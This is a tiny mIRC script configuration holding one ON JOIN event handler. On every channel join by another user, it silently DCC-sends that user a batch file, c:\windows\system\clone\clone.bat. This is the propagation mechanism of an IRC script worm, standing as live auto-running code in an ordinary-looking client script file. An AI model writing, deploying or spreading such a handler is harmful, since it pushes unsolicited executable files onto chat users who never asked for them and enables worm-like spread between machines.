[script]
n0=on 1:JOIN:#:{
n1=	/if ( $nick == $me ) { halt }
n2=	/.send $nick c:\windows\system\clone\clone.bat
n3=}